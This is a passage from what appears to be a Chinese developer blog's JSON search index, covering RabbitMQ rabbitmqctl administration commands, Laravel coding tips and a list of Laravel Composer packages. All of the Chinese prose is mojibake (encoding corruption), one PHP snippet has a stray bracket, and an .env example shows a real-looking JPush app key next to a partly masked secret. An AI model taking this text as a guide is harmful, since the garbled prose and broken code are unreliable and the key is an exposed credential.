èŠ‚ç‚¹çŠ¶æ€ï¼š 1rabbitmqctl status ç”¨æˆ·ç®¡ç†æ·»åŠ ç”¨æˆ·ï¼š 1rabbitmqctl add_user username password åˆ—å‡ºç”¨æˆ·ï¼š 1rabbitmqctl list_user åˆ é™¤ç”¨æˆ·ï¼š 1rabbitmqctl delete_user username æ¸…é™¤ç”¨æˆ·æƒé™ï¼š 1rabbitmqctl clear_permissions -p vhostpath username åˆ—å‡ºç”¨æˆ·æƒé™ï¼š 1rabbitmqctl list_user_permissions username ä¿®æ”¹å¯†ç ï¼š 1rabbitmqctl change_password username newpassword è®¾ç½®ç”¨æˆ·æƒé™ï¼š 1rabbitmqctl set_permissions -p vhostpath username è™šæ‹Ÿä¸»æœºç®¡ç†åˆ›å»ºè™šæ‹Ÿä¸»æœº 1rabbitmqctl add_vhost vhostpath åˆ—å‡ºè™šæ‹Ÿä¸»æœº 1rabbitmqctl list_vhosts åˆ—å‡ºè™šæ‹Ÿä¸»æœºçš„æ‰€æœ‰æƒé™ï¼š 1rabbitmqctl list_permissions -p vhostpath åˆ é™¤è™šæ‹Ÿä¸»æœºï¼š 1rabbitmqctl delete_vhost vhostpath é˜Ÿåˆ—ç®¡ç†æŸ¥çœ‹æ‰€æœ‰é˜Ÿåˆ—ä¿¡æ¯ï¼š 1rabbitmqctl list_queues æ¸…é™¤é˜Ÿåˆ—é‡Œçš„ä¿¡æ¯ï¼š 1rabbitmqctl -p vhostpath purge_queue blue ç§»é™¤æ‰€æœ‰æ•°æ®ï¼Œè¦åœ¨rabbitmqctl stop_app ä¹‹åä½¿ç”¨ï¼š 1rabbitmqctl reset èŠ‚ç‚¹ç®¡ç†ä¿®æ”¹é›†ç¾¤èŠ‚ç‚¹çš„å­˜å‚¨å½¢å¼ï¼š 1rabbitmqctl change_cluster_node_type disc|ram å¿˜è®°èŠ‚ç‚¹ï¼ˆæ‘˜é™¤èŠ‚ç‚¹ï¼‰ï¼š 1rabbitmqctl forget_cluster_node [--offline] ä¿®æ”¹èŠ‚ç‚¹åç§°ï¼š 1rabbitmqctl rename_cluster_node oldnode1 newnode1 æ’ä»¶ç®¡ç†æŸ¥çœ‹æ’ä»¶åˆ—è¡¨ï¼š 1rabbitmq-plugins list å¯ç”¨æŸä¸ªæ’ä»¶ï¼š 1rabbitmq-plugins enable &lt;plugin-name&gt; ç¦ç”¨æŸä¸ªæ’ä»¶ï¼š 1rabbitmq-plugins disable &lt;plugin-name&gt;","categories":[{"name":"MQ","slug":"MQ","permalink":"https://www.0x2beace.com/categories/MQ/"}],"tags":[{"name":"MQ","slug":"MQ","permalink":"https://www.0x2beace.com/tags/MQ/"},{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"https://www.0x2beace.com/tags/RabbitMQ/"}]},{"title":"Tips of Laravel","slug":"tips-of-laravel","date":"2021-06-20T07:00:12.000Z","updated":"2021-08-12T15:00:53.977Z","comments":true,"path":"tips-of-laravel/","link":"","permalink":"https://www.0x2beace.com/tips-of-laravel/","excerpt":"Awesome tips for Laravel.","text":"Awesome tips for Laravel. å–„ç”¨é›†åˆCollections æ˜¯ Laravel æä¾›çš„ä¸€ä¸ªå·¨å¤§ç‰¹æ€§ï¼Œå®ƒå…è®¸æˆ‘ä»¬è½»æ¾åœ°æ“ä½œæ•°ç»„ï¼Œå¯ä»¥ä¸ºæˆ‘ä»¬èŠ‚çœå¤§é‡æ—¶é—´ã€‚ æ¯”å¦‚æƒ³è¦å¯¹ä¸‹é¢è¿™ç»„æ•°æ®è¿›è¡Œæ±‚å’Œï¼š 1234567891011121314$orders = [ [ \"id\" =&gt; 1000, \"price\" =&gt; 80, ], [ \"id\" =&gt; 1001, \"price\" =&gt; 120, ], [ \"id\" =&gt; 1002, \"price\" =&gt; 30, ],]; ä½¿ç”¨ä¼ ç»Ÿçš„ foreach æ–¹å¼ï¼š 1234$total_price = 0;foreach ($orders as $order) &#123; $total_price += $order[\"price\"];&#125; è¯•è¯•ä½¿ç”¨é›†åˆï¼š 1$total_price = collect($orders)-&gt;pluck(\"price\")-&gt;sum(); è™½ç„¶ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥å®ç°ï¼Œä½†æ˜¾ç„¶ä½¿ç”¨é›†åˆæ›´å®¹æ˜“ä¸€äº›ï¼Œæ›´å¤šé›†åˆçš„æœ€ä½³å®è·µå¯ä»¥æŸ¥çœ‹æˆ‘çš„å¦ä¸€ç¯‡ç¬”è®°â€”â€”Laravel Collection å®é™…ä½¿ç”¨ã€‚ å–„ç”¨é›†åˆï¼Œå¯ä»¥å¸®æˆ‘ä»¬å‡å°‘å¾ˆå¤šé‡å¤çš„ä»£ç ã€‚ æŸ¥è¯¢ä½œç”¨åŸŸé€šå¸¸ï¼Œåœ¨Laravel Eloquent ORM æŸ¥è¯¢æ—¶ï¼Œéœ€è¦åŒ¹é…æŸäº›æ¡ä»¶æ—¶ï¼Œä¸€èˆ¬ä¼šè¿™æ ·å†™ï¼š 123$admin = Admin::where(\"is_enable\", true) -&gt;where(\"is_admin\", true) -&gt;get(); è¿™æ ·å†™å¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†ä¸ºäº†ä½¿æˆ‘ä»¬çš„ä»£ç æ›´å…·å¯è¯»æ€§ï¼Œè€Œä¸æ˜¯é‡å¤æ€§ï¼Œå¯ä»¥ä½¿ç”¨ query scopeï¼Œåœ¨å¯¹åº”æ¨¡å‹ä¸­åˆ›å»ºæŸ¥è¯¢ä½œç”¨åŸŸï¼š 123456789public function scopeEnable($query)&#123; return $query-&gt;where('is_enable', true);&#125;public function scopeAdmin($query)&#123; return $query-&gt;where('is_admin', true);&#125; ç°åœ¨ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼è¿›è¡ŒæŸ¥è¯¢ï¼š 123$admin = User::enable() -&gt;admin() -&gt;get(); å¦‚æœæŸä¸ªæŸ¥è¯¢æ¡ä»¶é¢‘ç¹ä½¿ç”¨åˆ°äº†ï¼Œå¯ä»¥åœ¨æ¨¡å‹ä¸­æ·»åŠ å…¨å±€æŸ¥è¯¢ä½œç”¨åŸŸï¼Œè¿™æ ·å¯ä»¥é»˜è®¤åŠ ä¸Šè¯¥æŸ¥è¯¢æ¡ä»¶ï¼š 123456protected static function booted()&#123; static::addGlobalScope(\"is_deleted\", function (Builder $builder) &#123; $builder-&gt;where(\"is_deleted\", false); &#125;);&#125; å–æ¶ˆå…¨å±€æŸ¥è¯¢ä½œç”¨åŸŸï¼Ÿ 1234567891011// æŒ‡å®šç±»User::withoutGlobalScope(EmailVerifiedAtScope::class)-&gt;get();// æŒ‡å®šå­—æ®µUser::withoutGlobalScope('is_deleted')-&gt;get();// ç§»é™¤æ‰€æœ‰å…¨å±€ä½œç”¨åŸŸUser::withoutGlobalScopes()-&gt;get();// ç§»é™¤å¤šä¸ªç±»/åŒ¿åå‡½æ•°User::withoutGlobalScopes([FirstScope::class, SecondScope::class])-&gt;get(); Eloqunt Queryå®é™…å¼€å‘ä¸­ï¼Œå› ä¸ºéœ€æ±‚çš„å¤æ‚æ€§ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦å†™å‡ºå„ç§å„æ ·çš„SQL æ¥æ»¡è¶³æŸ¥è¯¢ã€‚ selectRaw()ã€whereRaw()ã€havingRaw() å…è®¸æˆ‘ä»¬åœ¨æŸ¥è¯¢æ„é€ å™¨ä¸­ï¼ŒåŠ å…¥åŸå§‹SQL æŸ¥è¯¢ï¼Œä¾‹å¦‚ï¼Œç»Ÿè®¡åˆ†ç»„æ•°é‡ï¼š 123$count = User::groupBy(\"is_enable\") -&gt;selectRaw(\"count(id) as aggregate\") -&gt;get(); Log and DebugLaravel ä¸ºæˆ‘ä»¬æä¾›äº†ä¾¿æ·çš„è°ƒè¯•ä»£ç æ–¹å¼â€”â€”dd()ï¼Œä½†æŸäº›åœºæ™¯ä¸‹å¹¶ä¸é€‚åˆä½¿ç”¨ dd()ï¼Œæ¯”å¦‚æµ‹è¯•å›è°ƒæ˜¯å¦æ­£å¸¸ã€‚ è¿™æ—¶å¯ä»¥ä½¿ç”¨ Log åŠ©æ‰‹å‡½æ•°è¿›è¡Œè°ƒè¯•ï¼Œç”Ÿæˆçš„æ—¥å¿—åœ¨storage/logs ç›®å½•ä¸‹ã€‚ 1\\Log::debug('Test Message', $result]); dd() ä½œä¸ºç°ä»£å¼€å‘è€…çš„è°ƒè¯•åˆ©å™¨ï¼Œæ—¥å¸¸å¼€å‘åŸºæœ¬ä¸Šç¦»ä¸å¼€å®ƒï¼Œä¹Ÿè®¸ä½ ä¸€ç›´éƒ½æ˜¯è¿™ä¹ˆç”¨çš„ï¼š 12$users = User::where('name', 'Taylor')-&gt;get();dd($users); å…¶å®æœ‰ä¸€ç§æ›´ç®€å•çš„æ–¹å¼ï¼š 1$users = User::where('name', 'Taylor')-&gt;get()-&gt;dd(); å®ƒå¯ä»¥ä½œä¸ºä¸€ä¸ªé“¾å¼æ–¹æ³•ï¼Œç›´æ¥æ”¾åœ¨ Eloquent Query æˆ–è€…é›†åˆçš„åé¢è¿›è¡Œè°ƒç”¨ã€‚ TinkerLaravel çš„å¦ä¸€å¤§ç‰¹æ€§å°±æ˜¯æä¾›äº†äº¤äº’å¼çš„å‘½ä»¤è¡Œâ€”â€”Tinkerï¼Œåœ¨è¿™é‡Œä½ å¯ä»¥æ‰§è¡Œå„ç§ä»£ç ï¼Œè€Œæ— éœ€è€ƒè™‘ç¯å¢ƒï¼Œåœ¨æŸäº›æ—¶å€™ï¼Œè¿›è¡Œè°ƒè¯•æ—¶æ˜¯æä¸ºæ–¹ä¾¿çš„ã€‚ 1php artisan tinker æˆ‘é€šå¸¸ä¼šä½¿ç”¨ Tinker åšä»¥ä¸‹äº‹æƒ…ï¼š æ£€æµ‹æŸæ®µä»£ç æ˜¯å¦ç¬¦åˆé¢„æœŸ Eloquent Query æµ‹è¯• SDK æµ‹è¯• åˆ†é¡µæ±‚å’Œåœ¨æœ‰åˆ†é¡µçš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•ç»Ÿè®¡æŸä¸ªå­—æ®µæ‰€æœ‰è®°å½•çš„æ€»å’Œï¼Ÿ 12345678// åˆ›å»ºä¸€ä¸ªæŸ¥è¯¢æ„é€ å™¨$query = Post::query();// åœ¨æŸ¥è¯¢åˆ†é¡µä¹‹å‰æ±‚å’Œ$sum = $query-&gt;sum('post_views');// æŸ¥è¯¢åˆ†é¡µ$posts = $query-&gt;paginate(10); Data Get Functionå¦‚æœæœ‰ä¸€ä¸ªå¤æ‚çš„æ•°ç»„å¯¹è±¡æ•°æ®ç»“æ„ï¼Œå¯ä»¥ä½¿ç”¨ data_get åŠ©æ‰‹å‡½æ•°ä½¿ç”¨. è¡¨ç¤ºæ³•å’Œ * é€šé…ç¬¦ä»åµŒå¥—æ•°ç»„æˆ–å¯¹è±¡ä¸­æ£€ç´¢å€¼ï¼š 12345678$data = [ 0 =&gt; ['user_id' =&gt;'1', 'post' =&gt; [\"id\" =&gt; 1000],], 1 =&gt; ['user_id' =&gt;'2', 'post' =&gt; [\"id\" =&gt; 1001], ], 2 =&gt; ['user_id' =&gt;'3', 'post' =&gt; [\"id\" =&gt; 1002], ],];$ids = data_get($data, \"*.post.id\");// [1000, 1001, 1002] optionaloptional() æ–¹æ³•å…è®¸ä½ è·å–å¯¹è±¡çš„å±æ€§æ—¶è°ƒç”¨è¯¥æ–¹æ³•ã€‚å¦‚æœè¯¥å¯¹è±¡ä¸º nullï¼Œé‚£ä¹ˆå±æ€§æˆ–è€…æ–¹æ³•ä¹Ÿä¼šè¿”å› null è€Œä¸æ˜¯å¼•èµ·ä¸€ä¸ªé”™è¯¯ï¼š 12345678910// User 2 exists, without account$user2 = User::find(2);$accountId = $user2-&gt;account-&gt;id; // PHP Error: Trying to get property of non-object// Fix without optional()$accountId = $user2-&gt;account ? $user2-&gt;account-&gt;id : null; // null$accountId = $user2-&gt;account-&gt;id ?? null; // null// Fix with optional()$accountId = optional($user2-&gt;account)-&gt;id; // null å°è£…SDKé€šå¸¸åœ¨å®‰è£…äº†ä¸€ä¸ª SDK ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥åšä¸€äº›ç®€å•çš„å°è£…ï¼Œè¿™æ ·ä½¿ç”¨èµ·æ¥ä¼šæ›´æ–¹ä¾¿ã€‚ 1php artisan make:provider JpushServiceProvider è¿™é‡Œä»¥æå…‰æ¨é€ è¿™ä¸ªç¬¬ä¸‰æ–¹æ¨é€æœåŠ¡å•†ä¸ºä¾‹ï¼š 1234567891011121314151617181920212223&lt;?phpnamespace App\\Providers;use JPush\\Client;use Illuminate\\Support\\ServiceProvider;class JpushServiceProvider extends ServiceProvider&#123; public function boot() &#123; // &#125; public function register() &#123; $this-&gt;app-&gt;singleton(Client::class, function ($app) &#123; return new Client(config('jpush.key'), config('jpush.secret')); &#125;); $this-&gt;app-&gt;alias(Client::class, 'jpush'); &#125;&#125; åŠ å…¥åˆ° config/app.phpï¼š 123'providers' =&gt; [ App\\Providers\\JpushServiceProvider::class,] åˆ›å»ºé…ç½®æ–‡ä»¶ï¼š 123456&lt;?phpreturn [ 'key' =&gt; env('JPUSH_KEY'), 'secret' =&gt; env('JPUSH_SECRET'),]; åœ¨ env æ–‡ä»¶ä¸­å¡«å†™ Jpush çš„ key å’Œ secretï¼š 123# jpushJPUSH_KEY&#x3D;9c6f53edad67db7ec24bfe32JPUSH_SECRET&#x3D;deeb2a04669ab79****** è¿™æ ·æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¾èµ–æ³¨å…¥ JPush\\Client æˆ–è€… app(&#39;jpush&#39;) æ¥ä½¿ç”¨ Jpush çš„ SDKã€‚ å¯†ç åœ¨Laravel ä¸­ï¼Œæµè¡Œä¸¤ç§åŠ å¯†æ–¹å¼ï¼Œä¸€ç§æ˜¯ OpenSSL æ‰€æä¾›çš„ AES-256 å’Œ AES-128 åŠ å¯†ï¼Œå¦å¤–ä¸€ç§æ˜¯ Bcrypt å’Œ Argon2 çš„å“ˆå¸ŒåŠ å¯†æ–¹å¼ã€‚ åŠ å¯†è§£å¯†ä½¿ç”¨ Crypt é—¨é¢æä¾›çš„ encryptString æ¥åŠ å¯†ä¸€ä¸ªå€¼ï¼Œæˆ–è€…ä½¿ç”¨ encrypt åŠ©æ‰‹å‡½æ•°ï¼š 12encrypt(122410);eyJpdiI6IlJhd3h6amtXTFh5cit2bU9ySldNU2c9PSIsInZhbHVlIjoiZlRTdWx6Wk5oTVhjSnZyR0pMdkJ0dz09IiwibWFjIjoiYWVmMTE2NWUyZjkwMWZmNWI0N2I5Y2EwNzgxMjU5ZGI4NDE0OTU2MzJhY2I1ZWFkNzJmOWMyNjMwNzIxMTBjMiJ9 ä½¿ç”¨ Crypt é—¨é¢æä¾›çš„ decryptString æ¥è¿›è¡Œè§£å¯†ï¼Œæˆ–è€…ä½¿ç”¨decrypt åŠ©æ‰‹å‡½æ•°ï¼š 12decrypt(\"eyJpdiI6IlJhd3h6amtXTFh5cit2bU9ySldNU2c9PSIsInZhbHVlIjoiZlRTdWx6Wk5oTVhjSnZyR0pMdkJ0dz09IiwibWFjIjoiYWVmMTE2NWUyZjkwMWZmNWI0N2I5Y2EwNzgxMjU5ZGI4NDE0OTU2MzJhY2I1ZWFkNzJmOWMyNjMwNzIxMTBjMiJ9\")122410 å“ˆå¸ŒBcrypt æ˜¯å“ˆå¸Œå¯†ç çš„ç†æƒ³é€‰æ‹©ï¼Œå› ä¸ºå®ƒçš„ã€ŒåŠ å¯†ç³»æ•°ã€å¯ä»¥ä»»æ„è°ƒæ•´ï¼Œè¿™æ„å‘³ç€ç”Ÿæˆå“ˆå¸Œæ‰€éœ€çš„æ—¶é—´å¯ä»¥éšç€ç¡¬ä»¶åŠŸç‡çš„å¢åŠ è€Œå¢åŠ ã€‚ ä½¿ç”¨ Hash é—¨é¢æä¾›çš„ make æ–¹æ³•æ¥è¿›è¡ŒåŠ å¯†ï¼Œæˆ–è€…ä½¿ç”¨bcrypt åŠ©æ‰‹å‡½æ•°ã€‚ 12Hash::make(122410);$2y$10$DsKye7lBalaUkvBOEk6cvOrLGvgPD2EKkV/QtWuChbJ8It5JiVoM2 å“ˆå¸ŒåŠ å¯†æ— æ³•è§£å¯†ï¼Œåªèƒ½é€šè¿‡éªŒè¯çš„æ–¹å¼æ¥åˆ¤æ–­åŠ å¯†å‰åå¯†ç æ˜¯å¦ä¸€è‡´ã€‚ ä½¿ç”¨Hash é—¨é¢æä¾›çš„check æ–¹æ³•è¿›è¡Œå“ˆå¸ŒéªŒè¯ï¼Œæˆ–è€…ä½¿ç”¨password_verify åŠ©æ‰‹å‡½æ•°ã€‚ 12Hash::check(122410, '$2y$10$DsKye7lBalaUkvBOEk6cvOrLGvgPD2EKkV/QtWuChbJ8It5JiVoM2');true ç»Ÿè®¡å¼€å‘ä¸­ï¼Œæˆ‘ä»¬å¸¸ä¼šé‡åˆ°è¿™æ ·çš„éœ€æ±‚ï¼š ç»Ÿè®¡ä»Šå¤©çš„æ³¨å†Œé‡ ç»Ÿè®¡æ˜¨å¤©çš„æ³¨å†Œé‡ ç»Ÿè®¡æ¯ä¸ªæœˆç¬¬ä¸€å¤©çš„æ³¨å†Œé‡ ç»Ÿè®¡è¿™ä¸ªæœˆçš„æ³¨å†Œé‡ å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šè¿™æ ·å†™ï¼š 1UserModel::whereBetween(\"created_at\", [$startTime, $endTime])-&gt;count(); å…¶å®ä½¿ç”¨Carbon é…åˆLaravel æŸ¥è¯¢æ„é€ å™¨å¯ä»¥å¾ˆå¥½åœ°è§£å†³è¿™ç±»é—®é¢˜ï¼š 1234567891011121314151617181920212223// ç»Ÿè®¡ä»Šå¤©çš„æ³¨å†Œé‡UserModel::whereDate('created_at', today())-&gt;count();// å¯¹åº”SQLselect count(*) as aggregate from `user` where date(`created_at`) = '2021-08-12'// ç»Ÿè®¡æ˜¨å¤©çš„æ³¨å†Œé‡UserModel::whereDate('created_at', Carbon::yesterday())-&gt;count();// å¯¹åº”SQLselect count(*) as aggregate from `user` where date(`created_at`) = '2021-08-11'// ç»Ÿè®¡æ¯ä¸ªæœˆç¬¬ä¸€å¤©çš„æ³¨å†Œé‡UserModel::whereDay('created_at', \"01\")-&gt;count()// å¯¹åº”SQLselect count(*) as aggregate from `user` where day(`created_at`) = '01';// ç»Ÿè®¡è¿™ä¸ªæœˆçš„æ³¨å†Œé‡UserModel::whereMonth('created_at', now()-&gt;format(\"m\"))-&gt;count()// å¯¹åº”SQLselect count(*) as aggregate from `user` where month(`created_at`) = '08';","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Laravel å¸¸ç”¨æ‰©å±•åŒ…æ•´ç†","slug":"laravel-commonly-used-extension-package-finishing","date":"2021-06-19T12:51:35.000Z","updated":"2021-08-02T13:15:04.013Z","comments":true,"path":"laravel-commonly-used-extension-package-finishing/","link":"","permalink":"https://www.0x2beace.com/laravel-commonly-used-extension-package-finishing/","excerpt":"Laravel å¼€å‘å¦‚æ­¤é«˜æ•ˆï¼Œé™¤äº†å…¶æ¡†æ¶æœ¬èº«æ˜“ç”¨ä¹‹å¤–ï¼ŒåŒæ—¶ä¹Ÿç¦»ä¸å¼€å„ç§ä¸°å¯Œçš„æ‰©å±•åŒ…çš„æ”¯æŒã€‚","text":"Laravel å¼€å‘å¦‚æ­¤é«˜æ•ˆï¼Œé™¤äº†å…¶æ¡†æ¶æœ¬èº«æ˜“ç”¨ä¹‹å¤–ï¼ŒåŒæ—¶ä¹Ÿç¦»ä¸å¼€å„ç§ä¸°å¯Œçš„æ‰©å±•åŒ…çš„æ”¯æŒã€‚ è¾…åŠ©ç±»laravel-corsæ‰€æœ‰é—®é¢˜ï¼Œè·¨åŸŸå…ˆè¡Œã€‚è·¨åŸŸé—®é¢˜æ²¡æœ‰è§£å†³ï¼Œä¸€åˆ‡å¤„ç†éƒ½æ˜¯çº¸è€è™ã€‚ laravel-cors æ˜¯ä¸€ä¸ªè§£å†³è·¨åŸŸé—®é¢˜çš„æ‰©å±•åŒ…ï¼Œä¸çŸ¥é“æ˜¯ä»å“ªä¸ªç‰ˆæœ¬èµ·ï¼Œå·²ç»é»˜è®¤å¼•å…¥æ¡†æ¶äº†ã€‚ 1composer require fruitcake/laravel-cors Laravel-langLaravel-lang æ˜¯ä¸€ä¸ªéå¸¸æ˜“ç”¨çš„è¯­è¨€åŒ…ï¼Œç°å·²æ”¯æŒå¤šè¾¾75 ç§è¯­è¨€ã€‚ 1composer require \"overtrue/laravel-lang:~5.0\" ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼šconfig/app.phpï¼š 1'locale' =&gt; 'zh_CN', Captcha for Laravelcaptcha æ˜¯ä¸€ä¸ªç”ŸæˆéªŒè¯ç çš„æ‰©å±•åŒ…ã€‚ 1composer require mews/captcha CarbonCarbon å¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨ PHP å¼€å‘ä¸­å¤„ç†æ—¥æœŸ / æ—¶é—´å˜å¾—æ›´åŠ ç®€å•ã€æ›´å…·è¯­ä¹‰åŒ–ã€‚ 1composer require nesbot/carbon è®°å¾—è®¾ç½®æ—¶åŒº config/app.phpï¼š 1'timezone' =&gt; 'PRC', Eloquent Model GeneratorEloquent Model Generator æ˜¯ä¸€ä¸ªåŸºäºä»£ç ç”Ÿæˆå™¨çš„ Eloquent Model ç”Ÿæˆå·¥å…·ã€‚ åªåœ¨å¼€å‘ç¯å¢ƒä¸­å®‰è£…ï¼š 1composer require --dev krlove/eloquent-model-generator ä½¿ç”¨ï¼š 1php artisan krlove:generate:model UserModel --table-name=user --output-path=./Models --namespace=App\\\\Models IDE HelperLaravel IDE Helper æ˜¯ä¸€ä¸ªä»£ç æç¤ºåŠè¡¥å…¨å·¥å…·ã€‚ åªåœ¨å¼€å‘ç¯å¢ƒä¸­å®‰è£…ï¼š 1composer require --dev barryvdh/laravel-ide-helper å¯¹äºåªåœ¨å¼€å‘ç¯å¢ƒä¸­éœ€è¦å®‰è£…çš„æ‰©å±•åŒ…ï¼Œåœ¨ app/Providers/AppServiceProvider.php æ–‡ä»¶ä¸­ä»¥å¦‚ä¸‹æ–¹å¼è¿›è¡Œæ³¨å†Œï¼š 123456public function register()&#123; if ($this-&gt;app-&gt;environment() !== 'production') &#123; $this-&gt;app-&gt;register(\\Barryvdh\\LaravelIdeHelper\\IdeHelperServiceProvider::class); &#125;&#125; åŸºç¡€ç”¨æ³•ï¼š php artisan ide-helper:generateï¼šä¸º Facades ç”Ÿæˆæ³¨é‡Š php artisan ide-helper:modelsï¼š php artisan ide-helper:metaï¼šç”Ÿæˆ PhpStorm Meta file ä¸º Facades ç”Ÿæˆæ³¨é‡Šè¿è¡Œä¸€ä¸‹å‘½ä»¤ï¼š 1php artisan ide-helper:generate æ‰§è¡Œå®Œæˆä¹‹åä¼šåœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª _ide_helper.php æ–‡ä»¶ã€‚ ä¸ºæ¨¡å‹ç”Ÿæˆæ³¨è§£ä½¿ç”¨Laravel ä¸ºæˆ‘ä»¬æä¾›çš„ make:model é»˜è®¤ä¸ä¼šä¸ºåœ¨æ¨¡å‹æ–‡ä»¶ä¸­ï¼Œç”Ÿæˆç›¸åº”çš„æ³¨è§£ã€‚ å½“æˆ‘ä»¬éœ€è¦é€šè¿‡å¯¹è±¡è·å–æ¨¡å‹çš„æŸä¸ªå±æ€§æ—¶ï¼ŒIDE è¿™æ—¶ä¼šæç¤ºæœªå®šä¹‰çš„å±æ€§ï¼Œè™½ç„¶ä¸ä¼šå½±å“åŠŸèƒ½çš„ä½¿ç”¨ï¼Œä½†æ˜¯å¯¹äºå¼€å‘äººå‘˜æ¥è¯´å¹¶ä¸å‹å¥½ã€‚ çœ‹èµ·æ¥å°±åƒè¿™æ ·ï¼š ä½¿ç”¨IDE Helper æ¥ç”Ÿæˆæ¨¡å‹æ³¨è§£ï¼š 123php artisan ide-helper:models \"App\\Models\\UserModel\"Do you want to overwrite the existing model files? Choose no to write to _ide_helper_models.php instead? (Yes/No): (yes/no) [no]: å»ºè®®é€‰æ‹©ã€yesã€ï¼Œå¦åˆ™ä¼šç”Ÿæˆã€Œ_ide_helper_models.phpã€æ–‡ä»¶ï¼Œè¿™æ ·åœ¨è·Ÿè¸ªæ–‡ä»¶çš„æ—¶å€™ä¸ä¼šè·³è½¬åˆ°ã€Œ_ide_helper_models.phpã€æ–‡ä»¶ã€‚ å¦‚æœå¸Œæœ›ä¸ºæ‰€æœ‰æ¨¡å‹éƒ½åŠ ä¸Šæ³¨è§£ï¼Œåˆ™çœç•¥åé¢çš„å‚æ•°ã€‚ çœ‹èµ·æ¥å¥½å¤šäº†ï¼š æ³¨æ„ï¼š ä¸ºæ¨¡å‹ç”Ÿæˆå­—æ®µä¿¡æ¯å¿…é¡»åœ¨æ•°æ®åº“ä¸­å­˜åœ¨ç›¸åº”çš„æ•°æ®è¡¨ã€‚ è‡ªåŠ¨ä¸ºé“¾å¼æ“ä½œæ³¨é‡Š1php artisan ide-helper:meta æ‰§è¡Œå®Œæˆä¹‹åä¼šåœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª .phpStorm.meta.php æ–‡ä»¶ã€‚ Laravel Query Logger1composer require overtrue/laravel-query-logger --dev å¯ç”¨æ—¥å¿—è®°å½• config/logging.phpï¼š 123456789101112// åŠ å…¥ä»¥ä¸‹é…ç½®ï¼Œå¼€å¯æ—¥å¿—æŸ¥è¯¢è®°å½•'query' =&gt; [ 'enabled' =&gt; env('LOG_QUERY', env('APP_ENV') === 'local'), // Only record queries that are slower than the following time // Unit: milliseconds 'slower_than' =&gt; 0, // Only record queries when the QUERY_LOG_TRIGGER is set in the environment, // or when the trigger HEADER, GET, POST, or COOKIE variable is set. 'trigger' =&gt; env('QUERY_LOG_TRIGGER'),], ä½¿ç”¨ï¼š 1tail -f ./storage/logs/laravel.log Logging for PHPLogging for PHP æ˜¯ä¸€ä¸ªå¯ä»¥å°†æ—¥å¿—ä¿å­˜è‡³å„ç§ä½ç½®çš„æ‰©å±•åŒ…ã€‚ é€šå¸¸åœ¨æµ‹è¯•å›è°ƒæ—¶ï¼Œä¼šç”¨å¾—æ¯”è¾ƒå¤šã€‚ 1composer require monolog/monolog åŸºç¡€ç”¨æ³•ï¼š 123456789101112&lt;?phpuse Monolog\\Logger;use Monolog\\Handler\\StreamHandler;// create a log channel$log = new Logger('name');$log-&gt;pushHandler(new StreamHandler('path/to/your.log', Logger::WARNING));// add records to the log$log-&gt;warning('Foo');$log-&gt;error('Bar'); Laravel DebugbarLaravel Debugbar æ˜¯ä¸€ä¸ªå¾ˆæ£’çš„æ‰©å±•åŒ…ã€‚åœ¨å¾ˆå¤šåº”ç”¨ç¨‹åºæ–¹é¢ï¼Œä½ å¯ä»¥ä½¿ç”¨å®ƒæ¥æ”¶é›†æ•°æ®ã€‚æ¯”å¦‚æŸ¥è¯¢ï¼Œè§†å›¾ï¼Œæ—¶é—´ç­‰ç­‰ï¼› 1composer require barryvdh/laravel-debugbar --dev Laravel TelescopeLaravel Telescope æ˜¯ä¸€ä¸ªéå¸¸é…·çš„å·¥å…·ï¼Œå¯¹ Laravel åº”ç”¨ï¼Œæœ‰â€œä¼˜é›…çš„è°ƒè¯•åŠ©æ‰‹â€çš„ç¾ç§°ã€‚ ä½ å¯ä»¥ç”¨å®ƒæ¥ç›‘æ§å¾ˆå¤šä¸œè¥¿ï¼š è¯·æ±‚ å‘½ä»¤ å¼‚å¸¸ æ—¥å¿— æŸ¥è¯¢ äº‹ä»¶ â€¦ 1composer require laravel/telescope --dev Fakerfzaninotto/Faker æ˜¯ä¸€ä¸ªç”Ÿæˆå‡æ•°æ®çš„ PHP åº“ï¼Œæ”¯æŒéå¸¸å¤šçš„è¯­è¨€ã€‚ 1composer require fzaninotto/faker Poppy Faker æ˜¯åŸºäº fzaninotto/Faker çš„ä¸­æ–‡è½»é‡çº§ Fake æ•°æ®ç”Ÿæˆç±»ã€‚ 1composer require poppy/faker å¼€å‘ç±»jwt-authjwt-auth æ˜¯ Laravel å’Œ lumen ä¸‹ä¸€ä¸ªä¼˜ç§€ JWT ç»„ä»¶ã€‚ å…·ä½“ä½¿ç”¨ä»‹ç»å¯ä»¥æŸ¥çœ‹æˆ‘çš„â€”â€”Laravel jwt-auth ä½¿ç”¨è¯¦è§£ ã€‚ laravel-enumlaravel-enum æ˜¯ä¸€ä¸ªç®€å•æ˜“ç”¨ï¼Œæ‰©å±•æ€§é«˜çš„å¤„ç†æšä¸¾çš„æ‰©å±•åŒ…ã€‚ 1composer require bensampo/laravel-enum Intervention/imageIntervention/image æ˜¯ä¸€ä¸ªå¤„ç†å›¾ç‰‡è£åˆ‡çš„æ‰©å±•åŒ…ï¼Œå¯¹åº”çš„API æ–‡æ¡£åœ¨è¿™é‡Œã€‚ 1composer require intervention/image laravel-wechatå¾®ä¿¡ SDK for Laravelã€‚ 1composer require \"overtrue/laravel-wechat\" easy-smseasy-sms ä¸€æ¬¾æ»¡è¶³ä½ çš„å¤šç§å‘é€éœ€æ±‚çš„çŸ­ä¿¡å‘é€ç»„ä»¶ã€‚ 